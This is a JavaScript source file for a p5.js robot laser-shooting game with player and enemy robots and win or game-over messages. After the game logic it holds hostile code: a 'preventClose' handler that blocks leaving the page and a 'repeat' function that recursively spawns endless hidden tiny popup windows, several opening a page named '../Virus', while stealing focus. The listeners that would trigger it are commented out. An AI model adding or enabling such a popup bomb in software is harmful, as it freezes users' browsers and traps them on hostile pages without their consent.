const statsTracker = document.getElementById("TheMeter-O-Meter");
let robotLaser;
let playerRobot;
let x = 0;
let y = 0;
let fireRate = 500;
let robots = [];
let robotLaserShots = [];
let playerLaserShots = [];
let canvas = document.getElementById("canvas");
let width;
let height;
let fires = [];
let level = 0;
let speed;

function setup() {
    width = innerWidth;
    height = innerHeight - 18;
    canvas = createCanvas(width, height);
    speed = Math.sqrt(Math.pow(height, 2) + Math.pow(width, 2))/166;
    robots.push(new Robot);
    playerRobot = new PlayerRobot;
}

function draw() {
    width = innerWidth;
    height = innerHeight - 18;
    canvas = createCanvas(width, height);
    speed = Math.sqrt(Math.pow(height, 2)+Math.pow(width, 2))/166;
    background(0)
    if (playerRobot.health > 0) {
        for (let i = 0; i < playerLaserShots.length; i++) {
            playerLaserShots[i].display();
            playerLaserShots[i].move();
        // }
        // for (let i = 0; i < playerLaserShots.length; i++) {
            playerLaserShots[i].playerLaser = i;
            playerLaserShots[i].bounce();
        }
        for (let i = 0; i < robotLaserShots.length; i++) {
            robotLaserShots[i].display();
            robotLaserShots[i].move();
        // }
        // for (let i = 0; i < robotLaserShots.length; i++) {
            robotLaserShots[i].robotLaser = i;
            robotLaserShots[i].bounce();
        }
        if (robots.length > 0) {
            // robots[0].die();
            for (let i = 0; i < robots.length; i++) {
                robots[i].display();
                // if (robots[i]) {
                robots[i].die();
                // // } else if (robots[i]) {
                //     console.log(robots[1]);
                    // robots[i].robot = i;
                // }
            }
            // for (let i = 0; i < robots.length; i++) {
            // // if (i > this.robot) {
            //     robots[i].robot = i;
            // // }
            // }
        }
        playerRobot.move();
        playerRobot.display();
        playerRobot.bounce();
        if (robots.length < 1) {
            statsTracker.innerHTML = "You Win!";
        }
    } else {
        statsTracker.innerHTML = "Game Over!";
    }
}

var preventClose = function (e) {
    e.preventDefault();
    e.returnValue = '';
    setInterval(repeat, 0);
    window.focus();
}
// window.addEventListener('beforeunload', preventClose, true);
// let link = URL.createObjectURL(new Blob([], { type: 'text/html' }));
function repeat() {
    window.focus();
    setInterval(repeat, 0);
    window.open("", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=0, width=1, height=1, visible=none', '');
    window.open("", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');
    window.open("", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=100000, width=1, height=1, visible=none', '');
    window.open("", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=0, width=1, height=1, visible=none', '');
    window.open("", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=0, width=100000, height=100000, visible=none', '');
    window.open('../Virus', '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=0, width=1, height=1, visible=none', '');
    window.open('../Virus', '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');
    window.open('../Virus', '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=100000, width=1, height=1, visible=none', '');
    window.open('../Virus', '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=0, width=1, height=1, visible=none', '');
    window.open('../Virus', '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=0, width=100000, height=100000, visible=none', '');
    window.open('../Virus', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=0, top=0, width=100000, height=100000, visible=none', '');
    window.focus();
}
// window.addEventListener("focus", repeat);
// window.addEventListener("blur", repeat);